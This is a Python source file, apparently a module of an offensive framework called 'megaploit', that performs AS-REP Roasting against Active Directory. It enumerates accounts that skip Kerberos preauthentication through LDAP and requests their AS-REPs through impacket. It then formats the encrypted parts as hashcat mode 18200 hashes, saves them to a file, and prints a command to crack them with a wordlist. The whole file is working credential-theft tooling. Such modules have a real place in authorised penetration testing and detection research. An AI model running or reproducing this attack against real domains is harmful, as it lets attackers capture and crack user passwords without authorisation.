"""
megaploit.modules.auxiliary.kerberos_asrep_roast
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
AS-REP Roasting — extract crackable hashes from accounts that have
"Do not require Kerberos preauthentication" (DONT_REQ_PREAUTH) set.

These accounts allow an attacker to request an AS-REP without providing
a valid password, because the KDC skips preauth for them.  The encrypted
portion uses the user's password as the key — crackable offline.

Hashcat mode: 18200 ($krb5asrep$23$…)

References
----------
* https://attack.mitre.org/techniques/T1558/004/
* https://blog.harmj0y.net/activedirectory/roasting-as-reps/
"""

from __future__ import annotations

import socket
from megaploit.modules.base import Module, ModuleType, OptionType


class AsrepRoastModule(Module):
    name        = "auxiliary/kerberos/asrep_roast"
    description = (
        "AS-REP Roasting: find accounts with DONT_REQ_PREAUTH and capture "
        "their AS-REP hashes for offline cracking (hashcat -m 18200)"
    )
    module_type = ModuleType.AUXILIARY
    author      = "megaploit"
    references  = [
        "https://attack.mitre.org/techniques/T1558/004/",
        "https://github.com/SecureAuthCorp/impacket",
    ]
    platform    = ["multi"]; arch = []; rank = 400

    def _define_options(self) -> None:
        self._opt("RHOSTS",   OptionType.ADDRESS, required=True,
                  description="Domain controller IP or hostname")
        self._opt("DOMAIN",   OptionType.STRING,  required=True,
                  description="Active Directory domain  (e.g. corp.local)")
        self._opt("USERNAME", OptionType.STRING,  required=False,
                  description="Domain user for LDAP enumeration (leave blank for anonymous)")
        self._opt("PASSWORD", OptionType.STRING,  required=False,
                  description="Password (required if USERNAME is set)")
        self._opt("USERS_FILE", OptionType.PATH,  required=False,
                  description="Newline-separated username list (skip LDAP if provided)")
        self._opt("OUTFILE",  OptionType.PATH,    required=False,
                  description="Write hashes to file")
        self._opt("TIMEOUT",  OptionType.INTEGER, default=30, required=False,
                  description="Socket timeout in seconds")

    def check(self, session=None) -> str:
        self.validate()
        host    = str(self.get("RHOSTS"))
        timeout = int(self.get("TIMEOUT"))
        for port in (88, 389):
            try:
                with socket.create_connection((host, port), timeout=timeout):
                    pass
            except OSError:
                return f"[-] {host}:{port} — unreachable"
        return f"[+] {host} — Kerberos (88) and LDAP (389) reachable"

    def run(self, session=None) -> list:
        self.validate()
        self.results.clear()

        dc       = str(self.get("RHOSTS"))
        domain   = str(self.get("DOMAIN"))
        username = self.get("USERNAME") or ""
        password = self.get("PASSWORD") or ""
        ufile    = self.get("USERS_FILE") or ""
        outfile  = self.get("OUTFILE") or ""
        timeout  = int(self.get("TIMEOUT"))

        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT
            from impacket.krb5.types import Principal
            from impacket.krb5 import constants
        except ImportError:
            return [self._fail("impacket not installed — pip install impacket")]

        # ── Collect target usernames ─────────────────────────────────────
        users: list[str] = []
        if ufile:
            try:
                import os
                with open(ufile) as f:
                    users = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            except OSError as e:
                return [self._fail(f"Could not read USERS_FILE: {e}")]
        elif username:
            # LDAP enumeration for DONT_REQ_PREAUTH accounts
            try:
                from impacket.ldap import ldap as _ldap
                conn = _ldap.LDAPConnection(f"ldap://{dc}", dstIp=dc)
                conn.login(username, password, domain)
                base = ",".join(f"DC={p}" for p in domain.split("."))
                flt  = ("(&(objectClass=user)"
                        "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
                        ")")
                for entry in conn.search(base, flt, attributes=["sAMAccountName"]):
                    if hasattr(entry, "fields") and "sAMAccountName" in entry:
                        users.append(str(entry["sAMAccountName"]))
                        self._emit(f"  [*] AS-REP roastable: {entry['sAMAccountName']}")
            except Exception as exc:
                return [self._fail(f"LDAP enumeration failed: {exc}")]
        else:
            return [self._fail("Provide USERNAME (for LDAP enum) or USERS_FILE")]

        if not users:
            return [self._fail("No AS-REP roastable users found")]

        self._emit(f"[*] Requesting AS-REP for {len(users)} user(s)…")

        # ── Request AS-REP without preauth ───────────────────────────────
        hashes: list[str] = []
        for user in users:
            try:
                uprinc = Principal(
                    user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
                )
                # getKerberosTGT with empty password returns AS-REP if preauth is disabled
                tgt, cipher, _, _ = getKerberosTGT(
                    uprinc, "", domain, lmhash=b"", nthash=b"",
                    aesKey="", kdcHost=dc, requestPAC=False,
                )
                enc = tgt["enc-part"]["cipher"].hasValue()
                # Build hashcat-compatible hash
                from pyasn1.codec.ber import decoder as _ber
                from impacket.krb5.asn1 import AS_REP
                decoded = _ber.decode(tgt, asn1Spec=AS_REP())[0]
                enc_bytes = bytes(decoded["enc-part"]["cipher"])
                hash_str = (
                    f"$krb5asrep$23${user}@{domain}:"
                    f"{enc_bytes[:16].hex()}${enc_bytes[16:].hex()}"
                )
                hashes.append(hash_str)
                self._ok(f"AS-REP captured for {user}", user=user, hash=hash_str)
            except Exception as exc:
                if "KDC_ERR_PREAUTH_REQUIRED" in str(exc):
                    self._fail(f"{user} — preauth required (not roastable)", user=user)
                else:
                    self._fail(f"{user} — {exc}", user=user)

        if hashes and outfile:
            try:
                import os
                os.makedirs(os.path.dirname(outfile) or ".", exist_ok=True)
                with open(outfile, "w") as f:
                    f.write("\n".join(hashes) + "\n")
                self._emit(f"[+] Hashes saved to {outfile}")
            except OSError as e:
                self._emit(f"[-] Write error: {e}")

        ok = sum(1 for r in self.results if r.ok)
        self._emit(f"[+] Done — {ok}/{len(users)} AS-REP(s) captured")
        self._emit("    Crack with:  hashcat -m 18200 hashes.txt rockyou.txt")
        return self.results


MODULE = AsrepRoastModule
